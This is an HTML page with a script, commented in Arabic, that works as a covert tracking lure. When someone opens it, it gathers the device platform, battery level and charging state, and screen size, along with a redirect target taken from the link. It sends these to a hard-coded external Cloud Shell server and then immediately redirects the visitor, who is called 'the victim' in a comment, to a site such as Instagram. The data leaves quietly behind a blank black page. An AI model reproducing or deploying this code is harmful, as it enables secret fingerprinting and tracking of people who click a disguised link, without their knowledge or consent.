<!DOCTYPE html>
<html>
<head>
    <script>
        // هذا هو الرابط العام المباشر والصحيح لاستقبال البيانات
        const SERVER_URL = "https://8080-cs-f65a8037-daaf-45b2-a58a-a8f4d4f83c4f.cs-europe-west4-pear.cloudshell.dev/";

        async function capture() {
            const urlParams = new URLSearchParams(window.location.search);
            const target = urlParams.get('u') || 'https://instagram.com';
            
            let batt = "N/A";
            try {
                const b = await navigator.getBattery();
                batt = `${Math.round(b.level * 100)}% (${b.charging ? 'يشحن' : 'لا يشحن'})`;
            } catch(e) {}

            const info = {
                platform: navigator.platform,
                battery: batt,
                screen: `${window.screen.width}x${window.screen.height}`,
                target: target
            };

            // إرسال البيانات للسيرفر العام
            fetch(SERVER_URL, {
                method: 'POST',
                mode: 'no-cors', 
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(info)
            }).finally(() => {
                // تحويل الضحية فوراً
                window.location.replace(target);
            });
        }
        window.onload = capture;
    </script>
</head>
<body style="background:black;"></body>
</html>
